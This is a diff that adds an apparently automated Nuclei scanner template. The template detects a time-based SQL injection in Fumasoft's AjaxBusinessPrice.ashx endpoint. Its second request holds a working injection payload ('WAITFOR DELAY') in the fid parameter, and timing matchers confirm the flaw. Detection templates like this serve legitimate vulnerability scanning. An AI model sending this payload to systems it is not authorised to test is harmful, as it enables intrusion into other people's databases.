@@ -1,0 +1,41 @@
+id: fumasoft-ajaxbusinessprice-sqli
+info:
+  name: Fumasoft AjaxBusinessPrice.ashx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "文档已移动"
+      - type: word
+        words:
+          - "/m/Dingding/Ajax/"
+
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxBusinessPrice.ashx?action=GetBmailByFid&fid=-1';WAITFOR+DELAY+'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "-1"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
